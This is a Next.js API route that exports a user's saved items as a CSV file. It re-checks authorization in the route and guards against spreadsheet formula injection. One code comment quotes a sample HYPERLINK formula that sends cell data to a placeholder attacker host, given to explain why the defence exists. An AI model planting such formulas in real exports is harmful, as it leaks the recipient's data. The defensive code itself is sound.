import { NextResponse } from "next/server";
import { createClient } from "@/lib/supabase/server";
import { getCurrentUser } from "@/lib/auth";
import { reportError } from "@/lib/errors";
import type { Item } from "@/lib/items";

/**
 * Neutralise spreadsheet formula injection.
 *
 * RFC 4180 quoting alone is not enough: Excel, LibreOffice and Google Sheets
 * all evaluate a cell whose text begins with =, +, - or @ (and treat a leading
 * tab or CR as a continuation). A saved item titled
 *   =HYPERLINK("http://evil.example?d="&A1,"Click me")
 * would become a live formula in the recipient's spreadsheet. Prefixing with an
 * apostrophe forces the cell to be read as text; the apostrophe is not shown.
 */
function neutralizeFormula(value: string): string {
  return /^[=+\-@\t\r]/.test(value) ? `'${value}` : value;
}

function csvEscape(value: string): string {
  const safe = neutralizeFormula(value);
  if (/[",\n\r]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

export async function GET() {
  // The proxy already blocks signed-out traffic, but authorization that lives
  // only in middleware is one config change (or one CVE-2025-29927) away from
  // being absent. Every route that reads user data re-checks here.
  const user = await getCurrentUser();

  if (!user) {
    return NextResponse.json({ error: "Not signed in." }, { status: 401 });
  }

  const supabase = await createClient();
  const { data: items, error } = await supabase
    .from("items")
    .select("*")
    .eq("user_id", user.id)
    .order("kind")
    .order("created_at")
    .returns<Item[]>();

  if (error) {
    const ref = reportError("export", error);
    return NextResponse.json(
      { error: `Couldn't build the export. (ref: ${ref})` },
      { status: 500 },
    );
  }

  const header = ["kind", "title", "url", "status", "deadline", "tags", "notes", "created_at"];
  const rows = (items ?? []).map((item) =>
    [
      item.kind,
      item.title,
      item.url,
      item.status,
      item.deadline ?? "",
      item.tags.join("; "),
      item.notes ?? "",
      item.created_at,
    ]
      .map((v) => csvEscape(String(v)))
      .join(","),
  );

  // CRLF per RFC 4180, and a UTF-8 BOM so Excel on Windows reads accented
  // characters correctly instead of mojibake.
  const csv = "﻿" + [header.join(","), ...rows].join("\r\n");
  const date = new Date().toISOString().slice(0, 10);

  return new NextResponse(csv, {
    headers: {
      "Content-Type": "text/csv; charset=utf-8",
      "Content-Disposition": `attachment; filename="trackly-export-${date}.csv"`,
      "Cache-Control": "no-store",
    },
  });
}
